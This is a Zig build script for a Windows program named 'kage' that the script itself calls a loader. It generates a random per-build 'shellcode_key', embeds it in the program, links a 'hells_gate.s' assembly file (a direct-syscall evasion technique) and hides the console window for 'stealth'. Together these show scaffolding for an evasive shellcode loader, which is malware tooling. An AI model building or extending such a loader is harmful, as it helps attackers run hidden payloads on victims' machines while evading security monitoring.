const std = @import("std");

pub fn build(b: *std.Build) void {
    const target = b.standardTargetOptions(.{ .default_target = .{
        .cpu_arch = .x86_64,
        .os_tag = .windows,
        .abi = .gnu,
    } });
    const optimize = b.standardOptimizeOption(.{});

    var key: [16]u8 = undefined;
    var rng = std.Random.DefaultPrng.init(@intFromPtr(b));
    rng.random().bytes(&key);
    const key_u128 = std.mem.readInt(u128, &key, .little);

    const options = b.addOptions();
    options.addOption(u128, "shellcode_key", key_u128);

    const module = b.createModule(.{
        .root_source_file = b.path("src/main.zig"),
        .target = target,
        .optimize = optimize,
    });
    module.addOptions("build_options", options);
    module.addAssemblyFile(b.path("src/hells_gate.s"));

    const exe = b.addExecutable(.{
        .name = "kage",
        .root_module = module,
    });
    // .Windows = no console window (stealth). Change to .Console for debug output.
    exe.subsystem = .Windows;

    b.installArtifact(exe);

    const run_cmd = b.addRunArtifact(exe);
    run_cmd.step.dependOn(b.getInstallStep());
    if (b.args) |args| run_cmd.addArgs(args);

    const run_step = b.step("run", "Run the loader");
    run_step.dependOn(&run_cmd.step);
}
